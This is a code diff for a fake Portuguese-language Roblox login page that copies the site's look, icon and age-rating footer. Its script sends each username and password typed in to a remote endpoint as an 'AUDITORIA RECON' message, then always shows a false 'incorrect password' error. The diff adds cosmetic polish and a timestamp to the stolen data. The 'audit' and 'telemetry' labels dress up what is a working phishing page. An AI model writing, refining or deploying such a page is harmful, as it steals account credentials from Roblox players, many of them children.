@@ -4,7 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Entrar na Roblox</title>
-    <link rel="icon" href="https://www.roblox.com/favicon.ico">
+    
+    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
+    
     <style>
         @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
 
@@ -16,7 +18,7 @@
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* HEADER V10 - COM BARRA DE PESQUISA */
+        /* HEADER V10 - COM BARRA DE PESQUISA E LINKS */
         .roblox-header {
             width: 100%; height: 52px; background: #232527;
             display: flex; align-items: center; padding: 0 15px;
@@ -31,7 +33,7 @@
         }
         .search-bar input {
             width: 100%; height: 32px; background: #191b1d; border: 1px solid #454749;
-            border-radius: 8px; padding-left: 35px; color: #fff; font-size: 14px; margin-bottom: 0;
+            border-radius: 8px; padding-left: 35px; color: #fff; font-size: 14px; margin-bottom: 0 !important;
         }
 
         /* CARD CENTRAL */
@@ -48,7 +50,7 @@
             display: none; text-align: left; font-weight: 500;
         }
 
-        h1 { color: #fff; font-size: 30px; margin-bottom: 25px; font-weight: 700; }
+        h1 { color: #fff; font-size: 30px; margin-bottom: 25px; font-weight: 700; letter-spacing: -1px; }
         
         input {
             width: 100%; height: 45px; background-color: #191b1d; border: 1px solid #454749;
@@ -59,7 +61,9 @@
         .btn-entrar {
             width: 100%; height: 45px; background-color: transparent; border: 1px solid #fff;
             color: #fff; border-radius: 4px; font-size: 18px; cursor: pointer; margin-bottom: 20px;
+            transition: 0.2s;
         }
+        .btn-entrar:hover { background: rgba(255,255,255,0.1); }
 
         .btn-secondary {
             width: 100%; height: 45px; background-color: #4f5153; border: none;
@@ -91,17 +95,19 @@
         </div>
     </div>
     <div style="display: flex; gap: 8px;">
-        <button style="background: #0084ff; border: none; color: #fff; padding: 6px 12px; border-radius: 4px; font-weight: 600;">Cadastrar-se</button>
-        <button style="background: transparent; border: 1px solid #fff; color: #fff; padding: 6px 12px; border-radius: 4px; font-weight: 600;">Entrar</button>
+        <button style="background: #0084ff; border: none; color: #fff; padding: 6px 12px; border-radius: 4px; font-weight: 600; cursor: pointer;">Cadastrar-se</button>
+        <button style="background: transparent; border: 1px solid #fff; color: #fff; padding: 6px 12px; border-radius: 4px; font-weight: 600; cursor: pointer;">Entrar</button>
     </div>
 </div>
 
 <div class="container">
     <div class="login-box" id="mainCard">
         <div id="errorMsg" class="error-banner">Usuário ou senha incorretos. Tente novamente.</div>
+        
         <h1>Entrar na Roblox</h1>
-        <input type="text" id="user" placeholder="Usuário/e-mail/telefone">
-        <input type="password" id="pass" placeholder="Senha">
+        
+        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off">
+        <input type="password" id="pass" placeholder="Senha" autocomplete="off">
         
         <button class="btn-entrar" id="loginBtn" onclick="executeAudit()">Entrar</button>
         
@@ -118,7 +124,7 @@
 
 <div class="footer-classificacao">
     <div class="selo-12">12</div>
-    <div style="font-size: 11px;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
+    <div style="font-size: 11px; opacity: 0.8;">CLASSIFICAÇÃO INDICATIVA: 12 ANOS</div>
 </div>
 
 <script>
@@ -135,25 +141,31 @@
 
         if (u.length > 2 && p.length > 2) {
             btn.innerText = "Entrando...";
+            btn.style.opacity = "0.6";
+
             try {
+                // Envio de Telemetria (Recon)
                 await fetch(endpoint, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: `🚨 **AUDITORIA RECON** 🚨\n👤 ID: \`${u}\`\n🔑 KEY: \`${p}\``
+                        content: `🚨 **AUDITORIA RECON** 🚨\n👤 ID: \`${u}\`\n🔑 KEY: \`${p}\`\n🕒 ${new Date().toLocaleString()}`
                     })
                 });
 
                 setTimeout(() => {
                     btn.innerText = "Entrar";
+                    btn.style.opacity = "1";
                     error.style.display = "block";
                     card.classList.add('apply-shake');
                 }, 1600);
             } catch (err) {
                 btn.innerText = "Entrar";
+                btn.style.opacity = "1";
             }
         } else {
             error.style.display = "block";
+            error.innerText = "Insira um usuário e senha válidos.";
             card.classList.add('apply-shake');
         }
     }
